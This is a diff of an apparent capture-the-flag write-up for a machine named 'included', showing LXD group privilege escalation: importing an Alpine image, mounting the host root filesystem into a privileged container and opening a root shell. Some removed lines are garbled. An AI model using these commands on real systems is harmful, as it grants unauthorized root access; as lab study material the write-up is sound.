@@ -68,7 +68,7 @@ total 4444
 ```
 
 
-# TODO: Fix output :)
+# Starting the apline image, mounting the filesystem as root
 ```
 mike@included:/tmp/ignore$ lxc image import ./al.tar.gz --alias alpine
 Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b                                                         
@@ -78,6 +78,7 @@ mike@included:/tmp/ignore$ export PS1='\$'
 $lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
 Device mydev added to r00t
 $lxc start r00t
+
 $lxc exec r00t /bin/sh
 ~ # whoami
 root
@@ -103,6 +104,7 @@ tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/sh
 tmpfs                   100.0K         0    100.0K   0% /mnt/root/var/lib/lxd/devlxd
 tmpfs                   100.0K         0    100.0K   0% /dev/.lxd-mounts
 tmpfs                   199.3M     40.0K    199.3M   0% /run
+
 ~ # ls -l /mnt/root/
 bin/            initrd.img      mnt/            snap/           vmlinuz
 boot/           initrd.img.old  opt/            srv/            vmlinuz.old
@@ -110,57 +112,6 @@ cdrom/          lib/            proc/           sys/
 dev/            lib64/          root/           tmp/
 etc/            lost+found/     run/            usr/
 home/           media/          sbin/           var/
-~ # ls -l /mnt/root/root/root.txt 
--r--------    1 root     root            33 Mar  9  2020 /mnt/root/root/root.txt
-~ # md5sum /mnt/root/root/root.txt 
-7ef07ff4703c59f103bdb88833f50666  /mnt/root/root/root.txt
 
-```
-## Import the alpine image
-```
-mike@included:/tmp/ignore$ lxc image import ./alpine-v3.13-x86_64-20210218_01tar.gz --alias alpine
-```
-## Run the image
-```
-mike@included:/tmp/ignore$ lxc init alpine r00t -c security.privileged=true
-Creating r00t
-```
-
-## Mount the root file system to the image
-```
-mike@included:/tmp/ignore$ g
-Device mydev added to r00t
-```
-
-## Start the container
-```
-mike@included:/tmp/ignore$ lxc start r00t
-```
-
-## Get a root shell :)
-```
-mike@included:/tmp/ignore$ lxc exec r00t /bin/sh
-~ # id
-uid=0(root) gid=0(root)
-
-```
-
-Not sure where the rest of the filesystem is...
-```
-/home # find / -name user.txt
-/th=/mnt/root/home/mike/user.txt
-find: /sys/kernel/debug: Permission denied
-/home # find / -name root.txt
-/th=/mnt/root/root/root.txt
-
-```
-
-# TODO: Fix line wrappings!
-The comman for lxd is so long that the line wraps in the terminal and doesn't execute correctly!
-
-```
-mike@included:/var/lib/tftpboot$ stty cols 120
-mike@included:/tmp/ignore$ export PS1='\$'
-$
 ```
 
